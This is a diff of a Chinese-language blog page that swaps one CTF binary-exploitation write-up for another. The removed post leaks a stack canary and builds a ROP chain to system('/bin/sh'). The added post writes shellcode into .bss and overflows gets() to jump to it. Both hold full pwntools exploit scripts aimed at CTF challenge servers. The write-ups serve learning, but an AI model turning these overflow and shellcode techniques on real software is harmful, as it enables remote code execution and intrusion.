@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>再战canary--尝试使用gdb | nianchu</title>
+<title>每日1+（认怂了） | nianchu</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
@@ -24,11 +24,11 @@
 
 
 
-    <meta name="description" content="题目为bugku pwn4
-先checksec一下看有什么保护和啥类型程序
-pwndbg&gt; checksec
-[*] '/home/nianchu/Desktop/bugku/pwn4'
-    Arch:     amd64-64-..." />
+    <meta name="description" content="buu ciscn_2019_n_5
+在buu上拿到附件 checksec一下
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canar..." />
     <meta name="keywords" content="" />
   </head>
   <body>
@@ -100,104 +100,60 @@ pwndbg&gt; checksec
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
           <div class="post-detail">
-            <h2 class="post-title">再战canary--尝试使用gdb</h2>
-            <div class="post-date">2021-07-21</div>
+            <h2 class="post-title">每日1+（认怂了）</h2>
+            <div class="post-date">2021-08-03</div>
             
             <div class="post-content" v-pre>
-              <h2 id="题目为bugku-pwn4">题目为bugku pwn4</h2>
-<p>先checksec一下看有什么保护和啥类型程序</p>
-<pre><code>pwndbg&gt; checksec
-[*] '/home/nianchu/Desktop/bugku/pwn4'
-    Arch:     amd64-64-little
+              <h2 id="buu-ciscn_2019_n_5">buu ciscn_2019_n_5</h2>
+<p>在buu上拿到附件 checksec一下</p>
+<pre><code>    Arch:     amd64-64-little
     RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
+    Stack:    No canary found
+    NX:       NX disabled
     PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
 </code></pre>
-<p>发现有Canary和NX保护，使用IDA64查看题目文件按F5反编译得伪代码</p>
+<p>发现这是64位系统 没开任何保护<br>
+打开ida64  找到main函数按F5获得伪代码</p>
 <pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  char buf[48]; // [rsp+10h] [rbp-240h] BYREF
-  char v5[520]; // [rsp+40h] [rbp-210h] BYREF
-  unsigned __int64 v6; // [rsp+248h] [rbp-8h]
+  char text[30]; // [rsp+0h] [rbp-20h] BYREF
 
-  v6 = __readfsqword(0x28u);
-  init();
-  write(1, &quot;Welcome!\n&quot;, 0x10uLL);
-  write(1, &quot;Please leave your name(Within 36 Length):&quot;, 0x29uLL);
-  read(0, buf, 0x300uLL);
-  printf(&quot;Hello %s\n&quot;, buf);
-  write(1, &quot;Please leave a message(Within 0x200 Length):&quot;, 0x2CuLL);
-  read(0, v5, 0x300uLL);
-  printf(&quot;your message is :%s \nBye~&quot;, v5);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts(&quot;tell me your name&quot;);
+  read(0, name, 0x64uLL);
+  puts(&quot;wow~ nice name!&quot;);
+  puts(&quot;What do you want to say to me?&quot;);
+  gets(text);
   return 0;
 }
 </code></pre>
-<p><img src="https://cc-nianchu.github.io/post-images/1626860885192.png" alt="" loading="lazy"><br>
-主要关注.text:000000000040082C                 mov     rax, fs:28h<br>
-和.text:0000000000400835                  mov    [rbp+var_8], rax<br>
-<img src="https://cc-nianchu.github.io/post-images/1626861002377.png" alt="" loading="lazy"><br>
-canary存在rbp+var_8，可以在0x40082C下断点，观察下。<br>
-下断点在0x40082C并输入r运行<br>
-<img src="https://cc-nianchu.github.io/post-images/1626861151630.png" alt="" loading="lazy"><br>
-输入n后发现rax的寄存器从0x400814变成0xfd158aa9e4871200<br>
-并且发现rax的值要赋给rbp-8<br>
-canary在内存是这样的<br>
-<img src="https://cc-nianchu.github.io/post-images/1626861272714.png" alt="" loading="lazy"><br>
-所以现在的思路是首先依据第一次回显泄露canary的值，第二次通过利用泄露的canary值实现栈溢出。<br>
-64位程序优先通过寄存器rdi传参，所以先找pop rdi ； ret<br>
-利用命令ROPgadget --binary pwn4_canary --only &quot;pop|rdi|ret&quot;<br>
-可以找到如下结果，我们选择0x400963（选个简单的）<br>
-还差一个/bin/sh我们可以在ida上按shift+F12 找到<br>
-<img src="https://cc-nianchu.github.io/post-images/1626861450260.png" alt="" loading="lazy"><br>
-最终如下<br>
-<img src="https://cc-nianchu.github.io/post-images/1626861486228.jpg" alt="" loading="lazy"><br>
-完整exp：</p>
-<pre><code># -- coding:utf-8 
-from pwn import *
-#p = process(&quot;./pwn4&quot;)
-context.log_level = 'debug'
-p = remote(&quot;114.67.246.176&quot;,15575)
-p.recvuntil(&quot;(Within 36 Length)&quot;)
-payload=&quot;a&quot;*(0x240-0x8) #canary在rbp-8的位置
-p.sendline(payload)
-#0a	12	87	e4	a9	8a	15	fd
-#\n         0a是\n 16进制
-canary_addr=u64('\x00'+p.recv(7)) 
-#system函数地址，用ida可以查
-system_addr = 0x400660
-#ROPgadget --binary pwn4_canary --only &quot;pop|rdi|ret&quot;
-#0x0000000000400963 : pop rdi ; ret
-pop_rdi_ret = 0x400963
-#/bin/sh地址 ida shift+F12可获得
-binsh_addr =0x601068
-payload ='a'*(0x210-0x8)
+<p>发现第一次让我们输入名字 然后限制长度为0x64  并且name是在.bss段上<br>
+第二次是利用gets函数，没有限制长度，可以用gets函数进行溢出<br>
+我们得思路是:<br>
+第一个漏洞写入shellcode<br>
+然后第二个漏洞溢出去到name参数去然后执行shellcode拿到shell<br>
+exp:</p>
+<pre><code>from pwn import*
 
-payload += p64(canary_addr)
-#rbp
-payload += p64(0x1)
+q=remote('node4.buuoj.cn',25042)
 
-payload += p64(pop_rdi_ret)
+q.sendlineafter('tell me your name',asm(shellcraft.sh()))
 
-payload += p64(binsh_addr)
+payload='a'*0x28+p64(0x601080)
+q.sendlineafter('What do you want to say to me?',payload)
 
-payload += p64(system_addr)
-
-p.recv()
-p.sendline(payload)
-p.interactive()
+q.interactive()
 </code></pre>
-<p>最后来个笔记<br>
-<img src="https://cc-nianchu.github.io/post-images/1626862721188.jpg" alt="" loading="lazy"></p>
 
             </div>
             
             
               <div class="next-post">
                 <div class="next">下一篇</div>
-                <a href="https://cc-nianchu.github.io/post/dynelf/">
+                <a href="https://cc-nianchu.github.io/post/mei-ri-3/">
                   <h3 class="post-title">
-                    DynELF
+                    每日3+
                   </h3>
                 </a>
               </div>
